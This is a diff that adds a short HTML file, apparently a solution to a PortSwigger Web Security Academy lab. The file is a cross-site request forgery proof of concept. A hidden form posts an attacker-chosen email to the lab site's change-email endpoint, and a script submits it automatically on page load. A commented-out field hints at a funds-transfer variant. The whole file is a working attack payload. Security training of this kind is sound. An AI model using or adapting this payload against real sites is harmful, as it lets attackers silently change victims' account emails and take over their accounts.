@@ -1,0 +1,19 @@
+<html>
+
+<body>
+    <form id="csrfForm"
+        action="https://0a68008a044f18a583eb0f31005a00a6.web-security-academy.net/my-account/change-email"
+        method="POST">
+        <input type="hidden" name="email" value="v1212@g.com">
+        <!-- <input type="hidden" name="to_account" value="attacker123"> -->
+        <input type="submit" value="Submit CSRF Request">
+    </form>
+    <script>
+        // Auto-submit the form to trigger CSRF attack
+        document.getElementById("csrfForm").submit();
+
+
+    </script>
+</body>
+
+</html>
